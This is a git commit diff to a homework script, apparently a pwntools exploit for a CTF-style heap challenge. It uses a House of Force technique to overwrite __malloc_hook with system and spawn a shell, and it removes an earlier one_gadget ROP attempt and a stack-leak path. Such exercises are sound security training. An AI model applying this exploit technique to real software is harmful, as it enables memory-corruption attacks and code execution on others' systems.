55964b2eeb35694b46f5f4142aee320fd4efe977
k123321141 <kk123321141@gamil.com>
2017-12-06 23:11:09 +0800

    quickly

--- hw5/script.py
+++ hw5/script.py
@@ -58,6 +58,7 @@ allocate(0x18,'b' * 0x10 + p64(0) + p64(0x1001-0x20) )
 allocate(0x2710,p64(0xdeadbeef) )
 allocate(0xf90,'a' * 8 )
 
+
 #leak info
 show()
 r.recvuntil('a'*8)
@@ -76,12 +77,13 @@ nb = -0x23750
 allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
 allocate(0x28,'b' * 0x20 + p64(0) + p64(0x1001-0x80) )
 
+
 #back again
 allocate(0x2710,p64(0xdeadbeef) )
 allocate(0xf30,'a' * 8 )
 allocate(0x38,'b' * 0x30 + p64(0) + p64(0xffffffffffffffff) )
 nb = -0x46770
-allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
+allocate(nb,'x'*8)#malloc a large bin size chunk, the unsorted bin chunk has been move to small bin
 
 #leak the heap info
 allocate(0x90,'y' * 0x90 )
@@ -102,71 +104,18 @@ def move_top_to_addr(old_addr, new_addr):
     nb = new_addr - (old_addr + 0x40) - 16
     allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
 
-"""
-    Start Prepare ROP, and use one gadget
-    
-    Write ROP chain to heap + 0x50
 
-    0x4526a 
-    execve("/bin/sh", rsp+0x30, environ)
-    constraints:
-        [rsp+0x30] == NULL
-    
-"""
-one_gadget = libc_base + 0x45216 
-
-rop = flat( [one_gadget] )
-allocate(0x48,'b'*0x48 + p64(0xffffffffffffffff) )
-allocate(0x108,rop.rjust(0x108,'\0') + p64(0xffffffffffffffff) ) 
-nb = -(0x50 + 0x110 + 0x10)
-allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
-
-
-"""
-    Now leak stack info, to control rip
-
-    I got a function call [program_invocation_short_name] which is in gnu libc space.
-
-    &program_invocation_short_name = libc_rw_base + 0x13d0
-    program_invocation_short_name = stack_base + 0x207b2
-
-"""
-move_top_to_addr(heap_base, libc_rw+0x13d0 - 0x30)
-#note the 0x20 small bin
-allocate(0x20, 's'*0x20 )
-show()
-
-r.recvuntil('s'*0x20)
-buf = str2addr( r.recvline() )
-stack_base = buf - 0x207b2
-print('buf : %s' % hex(buf))
-print('stack base : %s' % hex(stack_base))
-
-"""
-    Edit the return address of allocate_heap
-
-"""
-def test(old_addr, new_addr):
-    allocate(0x38,'b' * 0x30 + p64(0) + p64(0xffffffffffffffff) )
-    print('move top chunk to %s' % hex(new_addr))
-    nb = new_addr - (old_addr + 0x40) - 16
-    print'nb',hex(nb)
-    r.interactive()
-    allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
-
-#test(libc_rw + 0x13d0-0x30+0x30, stack_base + 0x10000)
 
 #malloc_hook 
 __malloc_hook = libc_rw + 0xb10
 
 
-move_top_to_addr(libc_rw + 0x13d0-0x30+0x30, __malloc_hook - 0x10)
+move_top_to_addr(heap_base, __malloc_hook - 0x10)
 bin_sh_addr = libc_base + 0x18cd17
 gets = libc_base + 0x6ed80
 system = libc_base + 0x45390
 data = flat([system])
 allocate(0x20, data)
-#allocate(bin_sh_addr, '1234')
 
 r.send('1')
 r.recvuntil(':')
